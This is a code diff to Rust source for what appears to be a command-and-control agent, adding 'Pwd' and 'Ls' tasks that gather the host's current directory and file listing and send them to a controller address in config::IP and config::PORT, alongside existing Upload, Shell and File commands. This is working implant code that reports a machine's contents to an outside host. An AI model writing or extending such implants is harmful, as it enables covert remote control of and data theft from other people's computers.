@@ -24,7 +24,9 @@ pub enum Command {
     Upload = 0x151,
     Shell = 0x152,
     Cd = 0x153,
-    Exit = 0x155,
+    Pwd = 0x154,
+    Ls = 0x155,
+    Exit = 0x199,
     Output = 0x200,
     File = 0x201
 }
@@ -38,7 +40,9 @@ impl Command {
             0x151 => Command::Upload,
             0x152 => Command::Shell,
             0x153 => Command::Cd,
-            0x155 => Command::Exit,
+            0x154 => Command::Pwd,
+            0x155 => Command::Ls,
+            0x199 => Command::Exit,
             0x201 => Command::File,
             _ => Command::Output,
         }
@@ -296,11 +300,35 @@ pub fn handle_response(serialized_data: Serializer) {
         }
         Command::Cd => {
             let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
-            let mut string_buffer = vec![0; string_len-1];
+            let mut string_buffer = vec![0; string_len-2];
             unpacker.read_exact(&mut string_buffer).unwrap();
             let path = String::from_utf8_lossy(&string_buffer);
 
             cd(String::from(path));
+        }
+        Command::Pwd => {
+            let mut payload = build_payload_send_output(*ID);
+            let directory = pwd();
+
+            payload.add_string(&directory);
+            match send(payload.get_buffer(), config::IP, config::PORT, false) {
+                Ok(_) => {
+                    //println!("{:?}", resp);
+                }
+                Err(_) => {
+                    //eprintln!("{:?}", e);
+                }
+            }
+        }
+        Command::Ls => {
+            let mut payload = build_payload_send_output(*ID);
+            let directory = ls();
+
+            payload.add_string(&directory);
+            match send(payload.get_buffer(), config::IP, config::PORT, false) {
+                Ok(_) => {}
+                Err(_) => {}
+            }
         }
         Command::NoJob => {
             //println!("no jobs for da agent");
@@ -339,10 +367,42 @@ fn exec_shell(command: &str) -> String {
 fn cd(path: String) -> bool {
     match std::env::set_current_dir(path) {
         Ok(_) => {
+            println!("yee haw");
             true
         }
-        Err(_) => {
+        Err(e) => {
+            eprintln!("{}", e);
             false
+        }
+    }
+}
+
+fn pwd() -> String {
+    match std::env::current_dir() {
+        Ok(path) => {
+            return path.to_string_lossy().to_string();
+        }
+        Err(_) => {
+            return String::from("error");
+        }
+    }
+}
+
+fn ls() -> String {
+    let mut directory_listing = String::new();
+    match std::fs::read_dir(".") {
+        Ok(dir) => {
+            for entry in dir {
+                if let Ok(entry) = entry {
+                    directory_listing.push_str(&entry.file_name().to_string_lossy());
+                    directory_listing.push('\n');
+                }
+            }
+            return directory_listing
+        }
+        Err(e) => {
+            eprintln!("{}", e);
+            return String::from("error")
         }
     }
 }
